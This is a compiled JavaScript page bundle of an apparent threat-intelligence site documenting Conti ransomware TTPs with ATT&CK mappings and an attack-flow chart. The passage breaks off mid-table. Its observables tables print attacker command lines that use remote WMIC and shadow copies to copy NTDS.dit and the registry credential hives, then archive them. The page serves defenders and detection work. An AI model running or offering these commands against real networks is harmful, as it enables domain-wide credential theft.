"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[4172],{3248:function(e,t,a){var n=a(7294),r=a(7273);r.Z.initialize({startOnLoad:!0});t.Z=function(e){var t=e.chart;return(0,n.useEffect)((function(){r.Z.contentLoaded()}),[]),n.createElement("div",{className:"mermaid"},t)}},8:function(e,t,a){a.r(t),a.d(t,{frontMatter:function(){return s},contentTitle:function(){return m},metadata:function(){return d},toc:function(){return c},default:function(){return k}});var n=a(7462),r=a(3366),l=(a(7294),a(4137)),o=a(3248),i=["components"],s={},m=void 0,d={unversionedId:"Sightings/Conti_Ransomware",id:"Sightings/Conti_Ransomware",isDocsHomePage:!1,title:"Conti_Ransomware",description:"Overview",source:"@site/docs/03-Sightings/03-Conti_Ransomware.md",sourceDirName:"03-Sightings",slug:"/Sightings/Conti_Ransomware",permalink:"/ac3-threat-sightings/docs/Sightings/Conti_Ransomware",tags:[],version:"current",sidebarPosition:3,frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Diavol_Ransomware",permalink:"/ac3-threat-sightings/docs/Sightings/Diavol_Ransomware"},next:{title:"BlackCat_Ransomware",permalink:"/ac3-threat-sightings/docs/Sightings/BlackCat_Ransomware"}},c=[{value:"Overview",id:"overview",children:[{value:"References:",id:"references",children:[]},{value:"Threat Actor Activity",id:"threat-actor-activity",children:[]},{value:"Count of documented TTPs by Tactic",id:"count-of-documented-ttps-by-tactic",children:[]},{value:"Attack Flow",id:"attack-flow",children:[]}]},{value:"Tactics, Techniques and Procedures",id:"tactics-techniques-and-procedures",children:[]},{value:"Tactics, Techniques, Procedures, Observables and Notes",id:"tactics-techniques-procedures-observables-and-notes",children:[]},{value:"TTP Profiles with Observables",id:"ttp-profiles-with-observables",children:[{value:"Conti used <em>WMIC via Cobalt Strike</em> for Execution.",id:"conti-used-wmic-via-cobalt-strike-for-execution",children:[]},{value:"Conti used <em>vssadmin via WMI and Cobalt Strike</em> to create a Volume Shadow Copy for Collection.",id:"conti-used-vssadmin-via-wmi-and-cobalt-strike-to-create-a-volume-shadow-copy-for-collection",children:[]},{value:"Conti used <em>doscmd/copy command via WMI and Cobalt Strike</em> to move system files including <em>NTDS.dit</em> for Collection.",id:"conti-used-doscmdcopy-command-via-wmi-and-cobalt-strike-to-move-system-files-including-ntdsdit-for-collection",children:[]},{value:"Conti used <em>7zip via WMI and Cobalt Strike</em> to archive collected files for Collection.",id:"conti-used-7zip-via-wmi-and-cobalt-strike-to-archive-collected-files-for-collection",children:[]},{value:"Conti used <em>ntdsutil</em> for Credential Access.",id:"conti-used-ntdsutil-for-credential-access",children:[]},{value:"Conti used <em>NetScan.exe via Cobalt Strike</em> to scan internal network for Discovery.",id:"conti-used-netscanexe-via-cobalt-strike-to-scan-internal-network-for-discovery",children:[]},{value:"Conti used <em>Rclone</em> to upload data to cloud storage for Exfiltration.",id:"conti-used-rclone-to-upload-data-to-cloud-storage-for-exfiltration",children:[]},{value:"Conti used <em>Rubeus.exe via Cobalt Strike</em> for Credential Access.",id:"conti-used-rubeusexe-via-cobalt-strike-for-credential-access",children:[]},{value:"Conti used a <em>PowerShell inline script via Cobalt Strike</em> to download and install <em>AnyDesk</em> Remote Access Tool for Persistence.",id:"conti-used-a-powershell-inline-script-via-cobalt-strike-to-download-and-install-anydesk-remote-access-tool-for-persistence",children:[]},{value:"Conti used <em>PowerShell</em> commandlets to allow incomming RDP connections on an uncommon port for Defense Evasion.",id:"conti-used-powershell-commandlets-to-allow-incomming-rdp-connections-on-an-uncommon-port-for-defense-evasion",children:[]},{value:"Conti used <em>COM+ Service DLL via Cobalt Strike</em> to dump <em>LSASS</em> process memory for Credential Access.",id:"conti-used-com-service-dll-via-cobalt-strike-to-dump-lsass-process-memory-for-credential-access",children:[]},{value:"Conti used <em>Task Manager over RDP</em>  to dump <em>LSASS</em> process memory for Credential Access.",id:"conti-used-task-manager-over-rdp--to-dump-lsass-process-memory-for-credential-access",children:[]},{value:"Conti used <em>WMIC via Cobalt Strike</em> to launch <em>comsvcs.dll</em> via <em>RunDll32</em> on remote systems for Credential Access.",id:"conti-used-wmic-via-cobalt-strike-to-launch-comsvcsdll-via-rundll32-on-remote-systems-for-credential-access",children:[]},{value:"Conti used <em>PSEXEC via Cobalt Strike</em> to launch <em>comsvcs.dll</em> via <em>RunDll32</em> on remote systems for Credential Access.",id:"conti-used-psexec-via-cobalt-strike-to-launch-comsvcsdll-via-rundll32-on-remote-systems-for-credential-access",children:[]},{value:"Conti used <em>PSEXEC via Cobalt Strike</em> to copy malicious files into remote systems for Lateral Movement.",id:"conti-used-psexec-via-cobalt-strike-to-copy-malicious-files-into-remote-systems-for-lateral-movement",children:[]},{value:"Conti used <em>WMIC via Cobalt Strike</em> to copy and start execution of malicious files into remote systems for Lateral Movement.",id:"conti-used-wmic-via-cobalt-strike-to-copy-and-start-execution-of-malicious-files-into-remote-systems-for-lateral-movement",children:[]},{value:"Conti used <em>SCHTASKS via Cobalt Strike</em> to execute malicious files into remote systems for Lateral Movement.",id:"conti-used-schtasks-via-cobalt-strike-to-execute-malicious-files-into-remote-systems-for-lateral-movement",children:[]},{value:"Conti used <em>AdFind via Cobalt Strike</em> for Discovery.",id:"conti-used-adfind-via-cobalt-strike-for-discovery",children:[]},{value:"Conti used <em>Cobalt Strike</em> to launch whole domain encryption for Impact.",id:"conti-used-cobalt-strike-to-launch-whole-domain-encryption-for-impact",children:[]},{value:"Conti used <em>RDP</em> to launch whole domain encryption for Impact.",id:"conti-used-rdp-to-launch-whole-domain-encryption-for-impact",children:[]}]}],p={toc:c};function k(e){var t=e.components,a=(0,r.Z)(e,i);return(0,l.kt)("wrapper",(0,n.Z)({},p,a,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("h2",{id:"overview"},"Overview"),(0,l.kt)("p",null,"This Threat Sighting documents Conti ransomware TTPs based on Conti leaks (back in August 2021 and more recently Feb/March 2022). This Threat Sighting is based on public reports."),(0,l.kt)("p",null,"This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Conti_Ransomware.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Conti_Ransomware.yml")),(0,l.kt)("p",null,"Author: Alejandro Houspanossian (@lekz86)"),(0,l.kt)("p",null,"Acknowledgements: @TheDFIRReport, @vxunderground"),(0,l.kt)("h3",{id:"references"},"References:"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://twitter.com/TheDFIRReport/status/1423361119926816776"},"https://twitter.com/TheDFIRReport/status/1423361119926816776")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://twitter.com/vxunderground/status/1423336151860002816"},"https://twitter.com/vxunderground/status/1423336151860002816")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://twitter.com/TheDFIRReport/status/1498658331883364360"},"https://twitter.com/TheDFIRReport/status/1498658331883364360")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://github.com/tsale/translated_conti_leaked_comms"},"https://github.com/tsale/translated_conti_leaked_comms")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/"},"https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://thedfirreport.com/2021/09/13/bazarloader-to-conti-ransomware-in-32-hours/"},"https://thedfirreport.com/2021/09/13/bazarloader-to-conti-ransomware-in-32-hours/"))),(0,l.kt)("h3",{id:"threat-actor-activity"},"Threat Actor Activity"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"WMIC via Cobalt Strike")," for Execution."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"vssadmin via WMI and Cobalt Strike")," to create a Volume Shadow Copy for Collection."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"doscmd/copy command via WMI and Cobalt Strike")," to move system files including ",(0,l.kt)("em",{parentName:"li"},"NTDS.dit")," for Collection."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"7zip via WMI and Cobalt Strike")," to archive collected files for Collection."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"ntdsutil")," for Credential Access."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"NetScan.exe via Cobalt Strike")," to scan internal network for Discovery."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"Rclone")," to upload data to cloud storage for Exfiltration."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"Rubeus.exe via Cobalt Strike")," for Credential Access."),(0,l.kt)("li",{parentName:"ul"},"Conti used a ",(0,l.kt)("em",{parentName:"li"},"PowerShell inline script via Cobalt Strike")," to download and install ",(0,l.kt)("em",{parentName:"li"},"AnyDesk")," Remote Access Tool for Persistence."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"PowerShell")," commandlets to allow incomming RDP connections on an uncommon port for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"COM+ Service DLL via Cobalt Strike")," to dump ",(0,l.kt)("em",{parentName:"li"},"LSASS")," process memory for Credential Access."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"Task Manager over RDP"),"  to dump ",(0,l.kt)("em",{parentName:"li"},"LSASS")," process memory for Credential Access."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"WMIC via Cobalt Strike")," to launch ",(0,l.kt)("em",{parentName:"li"},"comsvcs.dll")," via ",(0,l.kt)("em",{parentName:"li"},"RunDll32")," on remote systems for Credential Access."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"PSEXEC via Cobalt Strike")," to launch ",(0,l.kt)("em",{parentName:"li"},"comsvcs.dll")," via ",(0,l.kt)("em",{parentName:"li"},"RunDll32")," on remote systems for Credential Access."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"PSEXEC via Cobalt Strike")," to copy malicious files into remote systems for Lateral Movement."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"WMIC via Cobalt Strike")," to copy and start execution of malicious files into remote systems for Lateral Movement."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"SCHTASKS via Cobalt Strike")," to execute malicious files into remote systems for Lateral Movement."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"AdFind via Cobalt Strike")," for Discovery."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike")," to launch whole domain encryption for Impact."),(0,l.kt)("li",{parentName:"ul"},"Conti used ",(0,l.kt)("em",{parentName:"li"},"RDP")," to launch whole domain encryption for Impact.")),(0,l.kt)("h3",{id:"count-of-documented-ttps-by-tactic"},"Count of documented TTPs by Tactic"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"# Documented TTPs"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Exfiltration"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"++ (2)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"++ (2)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Collection"),(0,l.kt)("td",{parentName:"tr",align:null},"+++ (3)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,l.kt)("td",{parentName:"tr",align:null},"+++ (3)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"++++++ (6)")))),(0,l.kt)("h3",{id:"attack-flow"},"Attack Flow"),(0,l.kt)("p",null,"The chart below shows a graphical representation of the attack flow."),(0,l.kt)(o.Z,{chart:"\ngraph LR\nC2[Command And Control] --\x3e | _WMIC via Cobalt Strike_| EXE[Execution]\nC2[Command And Control] --\x3e | _vssadmin via WMI and Cobalt Strike_ to create a Volume Shadow Copy| COL[Collection]\nC2[Command And Control] --\x3e | _doscmd/copy command via WMI and Cobalt Strike_ to move system files including _NTDS.dit_| COL[Collection]\nC2[Command And Control] --\x3e | _7zip via WMI and Cobalt Strike_ to archive collected files| COL[Collection]\nC2[Command And Control] --\x3e | _ntdsutil_| CA[Credential Access]\nC2[Command And Control] --\x3e | _NetScan.exe via Cobalt Strike_ to scan internal network| D[Discovery]\nC2[Command And Control] --\x3e | _Rclone_ to upload data to cloud storage| EXFIL[Exfiltration]\nC2[Command And Control] --\x3e | _Rubeus.exe via Cobalt Strike_| CA[Credential Access]\nC2[Command And Control] --\x3e | a _PowerShell inline script via Cobalt Strike_ to download and install _AnyDesk_ Remote Access Tool| PER[Persistence]\nC2[Command And Control] --\x3e | _PowerShell_ commandlets to allow incomming RDP connections on an uncommon port| DE[Defense Evasion]\nC2[Command And Control] --\x3e | _COM+ Service DLL via Cobalt Strike_ to dump _LSASS_ process memory| CA[Credential Access]\nLatM[Lateral Movement] --\x3e | _Task Manager over RDP_  to dump _LSASS_ process memory| CA[Credential Access]\nC2[Command And Control] --\x3e | _WMIC via Cobalt Strike_ to launch _comsvcs.dll_ via _RunDll32_ on remote systems| CA[Credential Access]\nC2[Command And Control] --\x3e | _PSEXEC via Cobalt Strike_ to launch _comsvcs.dll_ via _RunDll32_ on remote systems| CA[Credential Access]\nC2[Command And Control] --\x3e | _PSEXEC via Cobalt Strike_ to copy malicious files into remote systems| LatM[Lateral Movement]\nC2[Command And Control] --\x3e | _WMIC via Cobalt Strike_ to copy and start execution of malicious files into remote systems| LatM[Lateral Movement]\nC2[Command And Control] --\x3e | _SCHTASKS via Cobalt Strike_ to execute malicious files into remote systems| LatM[Lateral Movement]\nC2[Command And Control] --\x3e | _AdFind via Cobalt Strike_| D[Discovery]\nC2[Command And Control] --\x3e | _Cobalt Strike_ to launch whole domain encryption| IMP[Impact]\nC2[Command And Control] --\x3e | _RDP_ to launch whole domain encryption| IMP[Impact]\n",mdxType:"Mermaid"}),(0,l.kt)("h2",{id:"tactics-techniques-and-procedures"},"Tactics, Techniques and Procedures"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1047 - Windows Management Instrumentation"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"WMIC via Cobalt Strike")," for Execution.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Collection"),(0,l.kt)("td",{parentName:"tr",align:null},"T1047 - Windows Management Instrumentation",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"vssadmin via WMI and Cobalt Strike")," to create a Volume Shadow Copy for Collection.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Collection"),(0,l.kt)("td",{parentName:"tr",align:null},"T1003.003 - OS Credential Dumping: NTDS",(0,l.kt)("br",null),"T1047 - Windows Management Instrumentation"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"doscmd/copy command via WMI and Cobalt Strike")," to move system files including ",(0,l.kt)("em",{parentName:"td"},"NTDS.dit")," for Collection.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Collection"),(0,l.kt)("td",{parentName:"tr",align:null},"T1560.001 - Archive Collected Data: Archive via Utility"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"7zip via WMI and Cobalt Strike")," to archive collected files for Collection.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1003.003 - OS Credential Dumping: NTDS"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"ntdsutil")," for Credential Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1046 - Network Service Scanning"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"NetScan.exe via Cobalt Strike")," to scan internal network for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Exfiltration"),(0,l.kt)("td",{parentName:"tr",align:null},"T1567 - Exfiltration Over Web Service"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"Rclone")," to upload data to cloud storage for Exfiltration.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting",(0,l.kt)("br",null),"T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"Rubeus.exe via Cobalt Strike")," for Credential Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001 - Command and Scripting Interpreter: PowerShell",(0,l.kt)("br",null),"T1071.001 - Application Layer Protocol: Web Protocols",(0,l.kt)("br",null),"T1219 - Remote Access Software",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used a ",(0,l.kt)("em",{parentName:"td"},"PowerShell inline script via Cobalt Strike")," to download and install ",(0,l.kt)("em",{parentName:"td"},"AnyDesk")," Remote Access Tool for Persistence.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1562.004 - Impair Defenses: Disable or Modify System Firewall",(0,l.kt)("br",null),"T1112 - Modify Registry"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," commandlets to allow incomming RDP connections on an uncommon port for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1003.001 - OS Credential Dumping: LSASS Memory",(0,l.kt)("br",null),"T1218.011 - Signed Binary Proxy Execution: Rundll32"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"COM+ Service DLL via Cobalt Strike")," to dump ",(0,l.kt)("em",{parentName:"td"},"LSASS")," process memory for Credential Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1021.001 - Remote Services: Remote Desktop Protocol",(0,l.kt)("br",null),"T1003.001 - OS Credential Dumping: LSASS Memory"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"Task Manager over RDP"),"  to dump ",(0,l.kt)("em",{parentName:"td"},"LSASS")," process memory for Credential Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1047 - Windows Management Instrumentation",(0,l.kt)("br",null),"T1003.001 - OS Credential Dumping: LSASS Memory"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"WMIC via Cobalt Strike")," to launch ",(0,l.kt)("em",{parentName:"td"},"comsvcs.dll")," via ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," on remote systems for Credential Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1569.002 - System Services: Service Execution",(0,l.kt)("br",null),"T1003.001 - OS Credential Dumping: LSASS Memory"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"PSEXEC via Cobalt Strike")," to launch ",(0,l.kt)("em",{parentName:"td"},"comsvcs.dll")," via ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," on remote systems for Credential Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,l.kt)("td",{parentName:"tr",align:null},"T1570 - Lateral Tool Transfer"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"PSEXEC via Cobalt Strike")," to copy malicious files into remote systems for Lateral Movement.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,l.kt)("td",{parentName:"tr",align:null},"T1570 - Lateral Tool Transfer"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"WMIC via Cobalt Strike")," to copy and start execution of malicious files into remote systems for Lateral Movement.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,l.kt)("td",{parentName:"tr",align:null},"T1570 - Lateral Tool Transfer",(0,l.kt)("br",null),"T1053.005 - Scheduled Task/Job: Scheduled Task"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"SCHTASKS via Cobalt Strike")," to execute malicious files into remote systems for Lateral Movement.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1016 - System Network Configuration Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"AdFind via Cobalt Strike")," for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"T1105 - Ingress Tool Transfer",(0,l.kt)("br",null),"T1486 - Data Encrypted for Impact",(0,l.kt)("br",null),"T1055 - Process Injection"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to launch whole domain encryption for Impact.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"T1105 - Ingress Tool Transfer",(0,l.kt)("br",null),"T1486 - Data Encrypted for Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to launch whole domain encryption for Impact.")))),(0,l.kt)("h2",{id:"tactics-techniques-procedures-observables-and-notes"},"Tactics, Techniques, Procedures, Observables and Notes"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"),(0,l.kt)("th",{parentName:"tr",align:null},"Notes"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1047"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"WMIC via Cobalt Strike")," for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c vssadmin list shadows >> c:\\\\log.txt\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c vssadmin create shadow /for=C: 2>&1\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy55\\\\Windows\\\\NTDS\\\\NTDS.dit c:\\\\temp\\\\log\\\\ & copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy55\\\\Windows\\\\System32\\\\config\\\\SYSTEM c:\\\\temp\\\\log\\\\ & copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy55\\\\Windows\\\\System32\\\\config\\\\SECURITY c:\\\\temp\\\\log\\\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\admin\\" /password:\\"cleartextpass\\" process call create \\"7za.exe a -tzip -mx5 \\\\\\\\DC01\\\\C$\\\\temp\\\\log.zip \\\\\\\\DC01\\\\C$\\\\temp\\\\log -pTOPSECRETPASSWORD\\"')),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"WMIC.exe")," (Windows Management Instrumentation Commandline utility) allows for command execution at remote hosts.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Collection"),(0,l.kt)("td",{parentName:"tr",align:null},"T1047",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"vssadmin via WMI and Cobalt Strike")," to create a Volume Shadow Copy for Collection."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c vssadmin list shadows >> c:\\\\log.txt\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c vssadmin create shadow /for=C: 2>&1\\"')),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"WMIC.exe")," (Windows Management Instrumentation Commandline utility) allows for command execution at remote hosts.",(0,l.kt)("br",null),"- ",(0,l.kt)("em",{parentName:"td"},"vssadmin.exe")," (Windows Volume Shadow Copy Service administrative tool) allows creating backups of computer files.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Collection"),(0,l.kt)("td",{parentName:"tr",align:null},"T1003.003",(0,l.kt)("br",null),"T1047"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used 